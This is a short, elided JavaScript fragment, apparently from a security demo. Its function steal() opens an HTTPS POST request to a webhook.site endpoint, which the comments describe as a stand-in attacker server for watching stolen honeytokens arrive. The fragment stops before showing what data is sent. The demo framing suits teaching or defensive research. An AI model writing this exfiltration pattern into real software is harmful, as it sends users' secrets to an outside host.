...
function steal() {
  ...
  //    For the demo, the "attacker's server" is our own webhook.site endpoint
  //    so we can watch the stolen honeytokens land there.
  const req = https.request(
    {
      hostname: "webhook.site",
      port: 443,
      path: "/7ae5db82-fa38-4b61-9ea8-c86f8d09dfd5",
      method: "POST",
